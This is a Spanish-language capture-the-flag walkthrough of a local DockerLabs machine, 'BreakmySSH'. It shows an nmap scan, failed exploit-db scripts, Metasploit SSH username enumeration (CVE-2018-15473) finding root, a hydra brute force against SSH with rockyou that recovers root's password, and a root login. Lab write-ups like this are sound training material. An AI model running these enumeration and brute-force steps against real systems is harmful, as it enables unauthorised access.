# 🎯 Máquina: BreakmySSH
**IP:** 172.17.0.2
**OS:** Linux (Docker)
**Dificultad:** Muy Facil

---
## 1. 🔍 Enumeración
```bash
nmap -p- -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-07 01:33 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: 8A:61:F3:B1:74:40 (Unknown)
```
Solo puerto 22 abierto, con OpenSSH 7.7.

## 2. 🔓 Explotación (Foothold)
Buscamos la posible vulnerabilidad asociada al servicio en el puerto 22.
```bash
searchsploit OpenSSH 7.7
OpenSSH 2.3 < 7.7 - Username Enumeration       |  linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC) |  linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)           |  linux/remote/45939.py
```
Copiamos el script encontrado para la versión vulnerable:
```bash
searchsploit -m 45233 #no funcionó, pasamos al comando manual:
cp /usr/share/exploitdb/exploits/linux/remote/45233.py .
```
```bash
ls
45233.py
```
```bash
cat 45233.py
# Exploit: OpenSSH 7.7 - Username Enumeration

#Lo ejecutamos
python3 45233.py
Traceback (most recent call last):
  File "/home/kali/Documents/Workspace/Dockerlabs/BreakmySSH/45233.py", line 30, in <module>
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: 'property' object is not subscriptable
```
Obtenemos un error, lo que indica que el script puede ya estar parcheado. Probamos con otro script:
```bash
python3 45939.py
Traceback (most recent call last):
  File "/home/kali/Documents/Workspace/Dockerlabs/BreakmySSH/45939.py", line 16, in <module>
    old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
            paramiko.common.MSG_SERVICE_ACCEPT]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
TypeError: 'property' object is not subscriptable
```
Pero llegamos al mismo error. Buscamos otra opción, sabiendo que tiene una versión vulnerable a enumeración de usuarios, probamos con `Metasploit Framework`.
```bash
msf > search CVE-2018-15473
 0  auxiliary/scanner/ssh/ssh_enumusers SSH Username Enumeration
```
Aprovechamos el script encontrado y lo probamos en la maquina victima:
```bash
msf > use 0
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
USER_FILE => /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User 'root' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Encontramos que el usuario root existe, gracias al script de `msfconsole`, probaremos fuerza bruta ya con el usuario:
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 22:46:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
```
## 3. 🚀 Escalada de Privilegios
Encontramos el usuario `root` vulnerable con la pass `estrella`!
Obteniendo así, acceso directo al usuario `root` del sistema:
```bash
ssh root@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@172.17.0.2's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@dockerlabs:~# whoami
root
```
## 4. 🚩 Banderas (Flags)
- **User:** 
- **Root**: 